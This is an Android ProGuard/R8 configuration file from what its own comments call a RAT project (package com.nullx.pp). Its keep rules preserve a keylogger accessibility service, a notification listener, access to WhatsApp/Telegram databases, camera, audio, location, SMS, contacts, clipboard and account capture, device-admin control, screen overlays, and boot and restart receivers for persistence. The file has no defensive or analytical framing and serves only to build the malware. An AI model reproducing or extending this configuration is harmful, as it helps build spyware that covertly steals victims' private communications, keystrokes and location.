# ============ KEEP ALL RAT SERVICES & CLASSES ============
-keep class com.nullx.pp.** { *; }
-keep class com.nullx.pp.services.** { *; }
-keep class com.nullx.pp.receivers.** { *; }
-keep class com.nullx.pp.utils.** { *; }

# ============ KEEP SOCKET.IO ============
-keep class io.socket.** { *; }
-keep class io.socket.engineio.** { *; }
-keep class io.socket.client.** { *; }
-keep class okhttp3.** { *; }
-keep class okio.** { *; }

# ============ KEEP CAMERA & MEDIA ============
-keep class androidx.camera.** { *; }
-keep class android.hardware.camera2.** { *; }
-keep class android.media.** { *; }

# ============ KEEP JSON PROCESSING ============
-keep class com.google.gson.** { *; }
-keep class org.json.** { *; }
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer

# ============ KEEP OKHTTP & NETWORK ============
-keep class okhttp3.** { *; }
-keep interface okhttp3.** { *; }
-keep class com.squareup.okhttp3.** { *; }

# ============ KEEP COROUTINES ============
-keep class kotlinx.coroutines.** { *; }
-keep class kotlin.coroutines.** { *; }

# ============ KEEP WORKMANAGER ============
-keep class androidx.work.** { *; }
-keep class androidx.work.impl.** { *; }

# ============ KEEP LIFECYCLE & VIEWMODEL ============
-keep class androidx.lifecycle.** { *; }
-keep class androidx.fragment.** { *; }
-keep class androidx.activity.** { *; }

# ============ KEEP ACCESSIBILITY SERVICE (KEYLOGGER) ============
-keep class android.accessibilityservice.** { *; }
-keep class com.nullx.pp.KeyloggerService { *; }

# ============ KEEP NOTIFICATION LISTENER ============
-keep class android.service.notification.** { *; }
-keep class com.nullx.pp.NotificationListenerService { *; }

# ============ KEEP DATABASE (WHATSAPP/TELEGRAM) ============
-keep class net.sqlcipher.** { *; }
-keep class net.zetetic.** { *; }

# ============ KEEP ENCRYPTION ============
-keep class org.bouncycastle.** { *; }

# ============ PREVENT R8 FROM STRIPPING NATIVE METHODS ============
-keepclasseswithmembernames class * {
    native <methods>;
}

# ============ KEEP REFLECTION CLASSES ============
-keepclassmembers class * {
    @androidx.annotation.Keep <methods>;
    @com.google.gson.annotations.SerializedName <fields>;
}

# ============ KEEP ALL LISTENERS ============
-keep class * implements android.content.DialogInterface$OnClickListener { *; }
-keep class * implements android.view.View$OnClickListener { *; }
-keep class * implements android.view.View$OnTouchListener { *; }
-keep class * implements android.view.View$OnKeyListener { *; }

# ============ KEEP ALL SERVICES ============
-keep class * extends android.app.Service { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.accessibilityservice.AccessibilityService { *; }
-keep class * extends android.service.notification.NotificationListenerService { *; }
-keep class * extends android.app.job.JobService { *; }

# ============ KEEP FLUTTER ============
-keep class io.flutter.** { *; }
-keep class io.flutter.embedding.** { *; }
-keep class io.flutter.plugin.** { *; }
-keep class io.flutter.view.** { *; }

# ============ KEEP METHOD CHANNEL ============
-keep class io.flutter.plugin.common.MethodChannel { *; }
-keep class io.flutter.plugin.common.EventChannel { *; }
-keep class io.flutter.plugin.common.BasicMessageChannel { *; }

# ============ KEEP AUDIO & VIDEO ============
-keep class android.media.AudioManager { *; }
-keep class android.media.MediaRecorder { *; }
-keep class android.media.MediaPlayer { *; }

# ============ KEEP LOCATION ============
-keep class android.location.** { *; }
-keep class com.google.android.gms.location.** { *; }

# ============ KEEP CONTACTS & SMS ============
-keep class android.provider.ContactsContract { *; }
-keep class android.provider.Telephony { *; }
-keep class android.telephony.** { *; }

# ============ KEEP TELEPHONY ============
-keep class android.telephony.TelephonyManager { *; }
-keep class android.telephony.SmsManager { *; }

# ============ KEEP VIBRATOR ============
-keep class android.os.Vibrator { *; }
-keep class android.os.VibrationEffect { *; }

# ============ KEEP BATTERY ============
-keep class android.os.BatteryManager { *; }

# ============ KEEP WALLPAPER ============
-keep class android.app.WallpaperManager { *; }

# ============ KEEP CLIPBOARD ============
-keep class android.content.ClipboardManager { *; }
-keep class android.content.ClipData { *; }

# ============ KEEP ACCOUNT MANAGER ============
-keep class android.accounts.AccountManager { *; }
-keep class android.accounts.Account { *; }

# ============ KEEP POWER MANAGER (WAKE LOCK) ============
-keep class android.os.PowerManager { *; }

# ============ KEEP DEVICE POLICY MANAGER ============
-keep class android.app.admin.DevicePolicyManager { *; }
-keep class com.nullx.pp.AdminReceiver { *; }

# ============ KEEP ALARM MANAGER ============
-keep class android.app.AlarmManager { *; }
-keep class android.app.PendingIntent { *; }

# ============ KEEP WINDOW MANAGER (OVERLAY) ============
-keep class android.view.WindowManager { *; }
-keep class android.view.WindowManager$LayoutParams { *; }

# ============ KEEP PROCESS ============
-keep class android.app.ActivityManager { *; }
-keep class android.app.ActivityManager$RunningAppProcessInfo { *; }

# ============ KEEP BROADCAST RECEIVERS ============
-keep class com.nullx.pp.BootReceiver { *; }
-keep class com.nullx.pp.AlarmReceiver { *; }
-keep class com.nullx.pp.CallReceiver { *; }
-keep class com.nullx.pp.SmsReceiver { *; }
-keep class com.nullx.pp.RestarterReceiver { *; }

# ============ KEEP CONTENT PROVIDER ============
-keep class androidx.core.content.FileProvider { *; }

# ============ DONT WARN ABOUT MISSING CLASSES ============
-dontwarn com.google.errorprone.annotations.**
-dontwarn org.checkerframework.**
-dontwarn javax.annotation.**
-dontwarn org.codehaus.mojo.**
-dontwarn com.ibm.icu.**
-dontwarn org.bouncycastle.jsse.**
-dontwarn org.conscrypt.**
-dontwarn org.openjsse.**

# ============ OPTIMIZATION FLAGS ============
-optimizationpasses 3
-dontpreverify
-dontoptimize
-verbose

# ============ KEEP ATTRIBUTES ============
-keepattributes *Annotation*
-keepattributes Signature
-keepattributes SourceFile
-keepattributes LineNumberTable
-keepattributes EnclosingMethod
-keepattributes InnerClasses
-keepattributes RuntimeVisibleAnnotations
-keepattributes RuntimeVisibleParameterAnnotations

# ============ KEEP GENERIC SIGNATURES ============
-keepattributes Signature

# ============ KEEP ENUM ============
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ============ KEEP SERIALIZABLE ============
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# ============ KEEP PARCELABLE ============
-keepclassmembers class * implements android.os.Parcelable {
    public static final ** CREATOR;
}

# ============ R8 FULL MODE OFF (biar semua service tetap jalan) ============
-dontoptimize
-dontobfuscate